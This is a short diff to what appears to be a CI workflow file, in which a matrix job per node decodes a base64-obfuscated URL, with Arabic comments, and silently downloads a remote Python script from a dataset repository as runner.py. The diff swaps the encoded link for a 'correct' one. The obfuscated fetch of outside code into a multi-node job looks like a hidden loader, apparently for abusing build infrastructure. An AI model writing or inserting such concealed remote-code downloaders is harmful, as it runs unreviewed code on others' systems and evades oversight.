@@ -26,8 +26,8 @@ jobs:
         run: |
           echo "[BOOT] Starting setup for Node-${{ matrix.node_index }}..."
           
-          # فك التشفير للرابط المحدد
-          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2JhYmEvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19ORVcucHk=" | base64 --decode)
+          # فك التشفير للرابط الصحيح
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2JhYmEvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
           curl -sL "$REMOTE_SRC" -o runner.py
           
